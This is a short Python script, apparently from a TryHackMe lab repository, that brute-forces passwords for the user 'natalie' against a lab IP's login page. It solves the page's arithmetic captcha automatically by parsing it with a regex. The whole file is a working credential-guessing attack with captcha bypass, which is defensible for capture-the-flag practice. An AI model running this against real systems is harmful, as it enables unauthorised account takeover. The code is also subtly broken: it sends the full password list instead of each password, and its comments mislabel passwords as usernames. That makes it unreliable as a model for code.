# https://github.com/djalilayed/tryhackme/blob/main/getusername.py
import requests
import re

# Function to extract the captcha question and answer from the login page
def extract_captcha(html):
    captcha_regex = r'(\d+)\s*([\+\-\*])\s*(\d+)\s*=\s*\?'
    match = re.search(captcha_regex, html)
    if match:
        num1 = int(match.group(1))
        operator = match.group(2)
        num2 = int(match.group(3))
        if operator == '+':
            answer = num1 + num2
        elif operator == '-':
            answer = num1 - num2
        elif operator == '*':
            answer = num1 * num2
        return answer
    else:
        return None

captcha_answer = 1
# Read usernames from file
with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file]
# Try each username
for password in passwords:
    # Send login request
    session = requests.session()
    #data = {'username': username, 'password': 'password'}
    #response = session.post('http://10.10.220.214/login', data=data)
    #captcha_answer = extract_captcha(response.text)
    data = {'username': 'natalie', 'password': passwords, 'captcha': captcha_answer}
    response = session.post('http://10.10.50.243/login', data=data)
    captcha_answer = extract_captcha(response.text)


    error_message_match = re.search(r'Error(.+)', response.text)
    if error_message_match:
        error_message = error_message_match.group(1)
    else:
        error_message = 'Error message not found'
    print(f"{password} - Error message: {error_message} ")